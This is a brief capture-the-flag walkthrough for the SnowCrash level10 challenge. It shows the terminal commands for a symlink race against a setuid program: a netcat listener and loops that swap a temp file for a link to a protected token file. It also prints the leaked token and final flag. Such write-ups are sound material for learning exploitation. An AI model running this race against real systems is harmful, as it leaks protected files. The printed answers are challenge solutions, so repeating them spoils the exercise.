### Comment obtenir le flag
in different terminals:  
  
level10@SnowCrash:~$ nc -lkv 6969  
  
level10@SnowCrash:~$ while true; do ./level10 /tmp/file 192.168.1.63; done  
  
level10@SnowCrash:~$ while true; do rm -Rf /tmp/file; echo "test" > /tmp/file; rm -Rf /tmp/file; ln -s /home/user/level10/token /tmp/file; rm -Rf /tmp/file; done  
  
Connection from 192.168.1.63 port 6969 [tcp/\*] accepted  
.\*( )\*.  
test  
Connection from 192.168.1.63 port 6969 [tcp/\*] accepted  
.\*( )\*.  
woupa2yuojeeaaed06riuj63c  
level10@SnowCrash:~$ su flag10  
Password:  
Don't forget to launch getflag !  
feulo4b72j7edeahuete3no7c
